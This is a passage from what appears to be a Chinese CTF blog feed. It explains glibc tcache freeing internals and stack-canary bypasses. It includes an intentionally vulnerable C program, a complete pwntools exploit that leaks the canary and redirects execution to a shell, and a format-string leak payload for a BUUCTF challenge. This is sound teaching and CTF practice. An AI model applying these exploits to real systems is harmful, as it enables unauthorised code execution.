data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19pbnRfZnJlZQ==\">¶</span></p>\n<p>跟进  <code>_int_free()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDEyMw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// 64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_count<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>判断  <code>tc_idx</code>  合法， <code>tcache-&gt;counts[tc_idx]</code>  在 7 个以内时，就进入  <code>tcache_put()</code> ，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</p>\n<p>tcache_put()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wdXQ=\">¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMjkwNw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's room</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   for more chunks.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>mchunkptr chunk<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_entry <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  e<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">++</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_puts()</code>  完成了把释放的 chunk 插入到  <code>tcache-&gt;entries[tc_idx]</code>  链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</p>\n<blockquote>\n<p>版权声明：本文为 CSDN 博主「董哥的黑板报」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>\n原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1L2FydGljbGUvZGV0YWlscy85Njg2NTMyMQ==\">https://blog.csdn.net/qq_41453285/article/details/96865321</span></p>\n<p>ctf-wiki:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUv\">tcache - CTF Wiki (ctf-wiki.org)</span></p>\n</blockquote>\n",
            "tags": [
                "堆"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/04/b-canary/",
            "url": "https://yhuanhuan01.github.io/2023/08/04/b-canary/",
            "title": "b_canary",
            "date_published": "2023-08-04T04:02:09.000Z",
            "content_html": "<h1 id=\"canary介绍\"><a class=\"markdownIt-Anchor\" href=\"#canary介绍\">#</a> canary 介绍：</h1>\n<ol>\n<li>在函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称为 “Canary”</li>\n<li>如果使用 IDA 反汇编的话，您可能会看到 IDA 会将这个随机数标注为 “Security Cookie”，在部分书籍的叙述中会用 Security Cookie 来引用这种随机数</li>\n<li>Canary 位于 EBP 之前，系统还将在内存区域中存放一个 Canary 的副本</li>\n<li>当栈中发生溢出时，Canary 将被首先淹没，之后才是 EBP 和返回地址</li>\n<li>在函数返回之前，系统将执行一个额外的安全验证操作，被称作 “Security check” 在 Security check 过程中，系统将比较栈帧中原先存放的 Canary 和在内存中的副本，如果两者不符合，说明栈帧中的 Canary 已被破坏，即栈中发生了溢出</li>\n<li>当检测到栈中发生了溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行</li>\n</ol>\n<h3 id=\"方法一-覆盖截断字符获取canary\"><a class=\"markdownIt-Anchor\" href=\"#方法一-覆盖截断字符获取canary\">#</a> 方法一 覆盖截断字符获取 Canary</h3>\n<h5 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h5>\n<p>Canary 设计其低字节为 \\x00，本意是阻止被 read、write 等函数直接将 Canary 读出来。通过栈溢出将低位的 \\x00 覆写，就可以读出 Canary 的值。</p>\n<p>从上面的分析，我们可以梳理出绕过的思路：</p>\n<p>构造第一次溢出，覆写 Canary 低字节 \\x00，读取出 Canary 值<br>\n构造第二次溢出，利用获取的 Canary 重新构造 payload，获取 shell。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// x00cannary.c</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">getshell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编译生成 32 为的 ELF 文件</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ gcc x00cannary.c -no-pie <span class=\"token parameter variable\">-m32</span> -fstack-protector <span class=\"token parameter variable\">-z</span> noexecstack <span class=\"token parameter variable\">-o</span> x00canary</pre></td></tr></table></figure><h6 id=\"查看保护\"><a class=\"markdownIt-Anchor\" href=\"#查看保护\">#</a> 查看保护</h6>\n<p><img data-src=\"/img/canary/image-20230804091104686.png\" alt=\"image-20230804091104686\"></p>\n<h6 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804091402007.png\" alt=\"image-20230804091402007\"></p>\n<p><img data-src=\"/img/canary/image-20230804091406354.png\" alt=\"image-20230804091406354\"></p>\n<p>会发现有后门函数，并且 v3 是我们的 canary。在 read 函数中有很明显的栈溢出漏洞。</p>\n<p>这题开启了的 Canary，所以直接进行栈溢出肯定是不行的。</p>\n<ul>\n<li>构造第一次溢出，覆写 Canary 低字节 \\x00，读取出 Canary 值，从栈顶到 Canary 低字节的距离应该是 0x70 - 0xc。</li>\n</ul>\n<ul>\n<li>构造第二次溢出，利用泄露的 canary 进行栈溢出.</li>\n</ul>\n<p>栈顶到 ebp 的距离是 0x70，Canary 到 ebp 的距离是 0xc，因此覆盖 Canary 之后，还要额外增加 0x8 的字节，再加上 ebp 本身长度 0x4，所以要额外增加 0xC 的字节内容。</p>\n<h6 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./x00canary'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>getshell <span class=\"token operator\">=</span> <span class=\"token number\">0x80485A6</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Hello Hacker!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>recvbytes <span class=\"token operator\">=</span> rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>recvbytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 获取 canary</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>canary <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xa</span><span class=\"token comment\">#经过调试发现低字节被覆盖了 0xa，故减去 0xa 即可</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'Canary: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># 第二次溢出</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xc</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>getshell<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"方法二-利用格式化字符串漏洞获取canary\"><a class=\"markdownIt-Anchor\" href=\"#方法二-利用格式化字符串漏洞获取canary\">#</a> 方法二 利用格式化字符串漏洞获取 Canary</h3>\n<h4 id=\"原理-2\"><a class=\"markdownIt-Anchor\" href=\"#原理-2\">#</a> 原理</h4>\n<p>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出 canary 的值，从而进行栈溢出。</p>\n<h4 id=\"bjdctf_2020_babyrop2buuctf在线评测-buuojcn\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_babyrop2buuctf在线评测-buuojcn\">#</a> [bjdctf_2020_babyrop2](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2JqZGN0Zl8yMDIwX2JhYnlyb3Ay\">BUUCTF 在线评测 (buuoj.cn)</span>)</h4>\n<p>​\t\tprintf 泄露并在覆盖 canary</p>\n<h6 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序</h6>\n<p><img data-src=\"/img/canary/canary1.png\" alt=\"image-20230608154555021\"></p>\n<p><img data-src=\"/img/canary/image-20230608154744048.png\" alt=\"image-20230608154744048\"></p>\n<h6 id=\"ida-2\"><a class=\"markdownIt-Anchor\" href=\"#ida-2\">#</a> IDA</h6>\n<ul>\n<li>gift 函数</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608154908039.png\" alt=\"image-20230608154908039\"></p>\n<ul>\n<li>vlun 函数</li>\n</ul>\n<p><img data-src=\"/img/canary/image-20230608155218476.png\" alt=\"image-20230608155218476\"></p>\n<ol>\n<li>gitf 函数很明显有格式话字串溢出，可以利用去泄露 canary。</li>\n<li>将泄露的 canary 去覆写在 buf 上，从而达到目的</li>\n</ol>\n<p>那么现在，我们只需要一个 system (/bin/sh) 就可以达到目的了。</p>\n<p><img data-src=\"/img/canary/image-20230608155517052.png\" alt=\"image-20230608155517052\"></p>\n<p><img data-src=\"/img/canary/image-20230608155613180.png\" alt=\"image-20230608155613180\"></p>\n<p>当我检查字符串时，并没有 /bin/sh 和 system 函数 plt 表项，所以需要我泄露 libc，去构建 system（/bin/sh）</p>\n<p>好，我们所有的大致思路有了，接下来，就是细节上功夫了。</p>\n<p>泄露 canary</p>\n<p>我们需要通过 gdb 调试（需要 gdb 与 pwndbg 联合调试，如果 gdb 没有 fmtarg 命令的或，需要通过下面连接去调整。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMi9hcnRpY2xlL2RldGFpbHMvMTA1NjQ4NzY5\">gdb+pwndbg 联合调试</span></p>\n<p><img data-src=\"/img/canary/image-20230608160451473.png\" alt=\"image-20230608160451473\"></p>\n<p>可以看到格式化字符串距离 rbp 有 5 的偏移，因为时 64 位程序，前 6 个参数需要放到寄存器内，所以距离 canary 的距离就有（5 + 6）的偏移。</p>\n<p>所以构造的第一份 payload1 为</p>\n<pre><code>%11$p\n</code></pre>\n<p>接下来就是，泄露 libc 基址和构造 ROP 链</p>\n<p>泄露 puts 函数地址</p>\n<figure class=\"highlight python\"><figcaption 